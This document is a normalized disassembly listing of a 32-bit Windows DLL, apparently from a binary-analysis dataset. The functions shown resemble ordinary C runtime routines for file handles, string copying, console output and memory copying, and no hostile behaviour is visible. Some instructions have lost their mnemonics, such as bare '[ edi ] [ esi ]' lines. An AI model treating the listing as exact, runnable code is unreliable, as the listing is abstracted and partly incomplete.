or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ esi ]
call sub_100184c3
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_100193c3
push 0x14
push r--data
call sub_10011e54
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov edi [ ebp + 0x18 ]
cmp edi esi
setne al
cmp eax esi
jne r-xdata
or [ edi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
je r-xdata
call sub_1001034f
push 0x16
pop edi
mov [ eax ] edi
push esi
push esi
push esi
push esi
push esi
call sub_100102e7
add esp 0x14
mov eax edi
jmp r-xdata
cmp [ ebp + 0x1c ] esi
je r-xdata
call sub_10011e99
retn
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_10018ca4
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10019461
mov eax [ ebp - 0x20 ]
cmp eax esi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ edi ] 0xffffffff
sub_10019461
cmp [ ebp - 0x1c ] esi
je r-xdata
retn
cmp [ ebp - 0x20 ] esi
je r-xdata
push [ edi ]
call sub_10019989
pop ecx
mov eax [ edi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_1001948f
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_100193c3
add esp 0x18
pop ebp
retn
sub_100194af
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1000c185
mov edi [ ebp - 0xc ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000cde3
add esp 0xc
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
push esi
mov esi [ ebp + 0xc ]
cmp esi ebx
jne r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx ax [ eax ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx ecx ax
movzx eax cl
test [ eax + edi + 0x1d ] 0x4
je r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ax [ esi ]
movzx eax ax
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp ax cx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
cmp al bl
jne r-xdata
movzx eax [ esi ]
xor ecx ecx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
pop esi
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp cx bx
je r-xdata
mov dl [ esi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
xor eax eax
jmp r-xdata
shl ecx 0x8
movzx ax al
or cx ax
inc [ ebp + 0x8 ]
movzx ecx cx
xor ecx ecx
jmp r-xdata
movzx eax ax
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
movzx dx dl
shl eax 0x8
or ax dx
inc esi
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10019634
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10019654
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_1000c176
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_10019699
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10019699
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_10019654
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10019749
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_10019768
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_10019749
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_1001976b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
jl r-xdata
call sub_1001034f
mov [ eax ] 0x9
call sub_10010362
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_100197ec
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_1001034f
mov [ eax ] 0x9
call sub_10010362
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_10019872
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_10010362
and [ eax ] 0x0
call sub_1001034f
mov [ eax ] 0x9
or eax 0xffffffff
pop ebp
retn
call sub_10010362
mov [ eax ] esi
call sub_1001034f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_100102e7
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax [ rw-data ]
jae r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
sub_100198e9
push 0xc
push r--data
call sub_10011e54
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_1001135a
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_10011e99
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10019980
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10017666
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_10019989
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_100199b0
push 0x18
push r--data
call sub_10011e54
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_10011297
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_1001135a
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10019b41
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_10011e99
retn
push 0x40
push 0x20
call sub_100159c7
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_100198e9
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_1001135a
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_10019a83
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_10017666
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_10019b4a
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_1001034f
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_100102e7
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ ebp + 0xc ] ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0x10 ]
cmp edi ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x14 ]
call sub_1000c185
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
mov [ esi ] bl
call sub_1001034f
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_100102e7
add esp 0x14
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov edx [ ebp + 0xc ]
mov eax esi
jne r-xdata
push [ ebp + 0x14 ]
push edi
push [ ebp + 0xc ]
push esi
call sub_10018256
add esp 0x10
jmp r-xdata
mov eax esi
jmp r-xdata
mov cl [ edi ]
mov [ eax ] cl
inc eax
inc edi
cmp cl bl
je r-xdata
mov cl [ edi ]
mov [ eax ] cl
inc eax
inc edi
cmp cl bl
je r-xdata
cmp [ ebp - 0x8 ] bl
je r-xdata
pop edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edx
je r-xdata
cmp edx ebx
jne r-xdata
dec edx
jne r-xdata
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov [ eax ] bl
inc eax
dec [ ebp + 0x14 ]
jne r-xdata
mov ecx eax
sub ecx esi
cmp ecx 0x2
jl r-xdata
cmp [ edi ] bl
je r-xdata
jmp r-xdata
cmp [ ebp - 0x8 ] bl
je r-xdata
lea edi [ eax - 0x2 ]
mov [ ebp + 0x14 ] edi
cmp edi esi
jb r-xdata
lea edi [ eax - 0x1 ]
mov [ ebp - 0x4 ] edi
cmp edi esi
jb r-xdata
cmp [ ebp + 0x14 ] 0x1
jne r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov eax edi
sub eax [ ebp + 0x14 ]
test al 0x1
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x14 ]
movzx eax [ eax ]
push eax
call sub_10013033
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
test al 0x1
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
push eax
call sub_10013033
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
mov [ edi ] bl
call sub_1001034f
mov ecx eax
push 0x2a
pop eax
mov [ ecx ] eax
dec [ ebp + 0x14 ]
cmp [ ebp + 0x14 ] esi
jae r-xdata
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jae r-xdata
mov [ esi ] bl
call sub_1001034f
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_100102e7
add esp 0x14
cmp [ ebp - 0x8 ] bl
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x1
jbe r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov [ esi + eax - 0x1 ] bl
lea edi [ esi + eax - 0x2 ]
mov [ ebp + 0x14 ] edi
cmp edi esi
jb r-xdata
push 0x50
pop eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx edi
sub ecx [ ebp + 0x14 ]
test cl 0x1
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x14 ]
movzx eax [ eax ]
push eax
call sub_10013033
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ edi ] bl
jmp r-xdata
mov eax [ ebp + 0xc ]
dec [ ebp + 0x14 ]
cmp [ ebp + 0x14 ] esi
jae r-xdata
cmp [ ebp - 0x8 ] bl
je r-xdata
sub_10019d59
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
call sub_1000fb02
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx eax
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
je r-xdata
push [ rw-data ]
call sub_1000fb0b
pop ecx
test eax eax
je r-xdata
push eax
call sub_1000fb0b
pop ecx
test eax eax
je r-xdata
push eax
call sub_1000fb0b
push [ rw-data ]
mov esi eax
call sub_1000fb0b
pop ecx
pop ecx
mov edi eax
test esi esi
je r-xdata
push eax
call sub_1000fa90
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_1000fa90
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_1000fa90
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_1000fa90
pop ecx
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test edi edi
je r-xdata
push r--data
push edi
call esi
push eax
call sub_1000fa90
pop ecx
mov [ rw-data ] eax
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
call esi
test eax eax
je r-xdata
push eax
call sub_1000fb0b
pop ecx
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0xc
lea ecx [ ebp - 0x14 ]
push ecx
push 0x1
push eax
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call eax
mov [ ebp - 0x4 ] eax
test [ ebp - 0xc ] 0x1
jne r-xdata
sub_10019ec2
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_1001034f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
pop esi
pop ebp
retn
mov eax [ rw-data ]
jmp r-xdata
sub_10019f0d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_1001af07
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1000c176
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
sub_10019fd2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1000c185
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_100183c0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_1001034f
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_1001a110
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_1001a13b
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_1001a1c2
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_1001a1c2
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_1001a13b
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_1001a2b0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_1001a2e4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1000c185
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_1001840b
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1001a335
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1001a2e4
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_1001a363
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1000c185
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
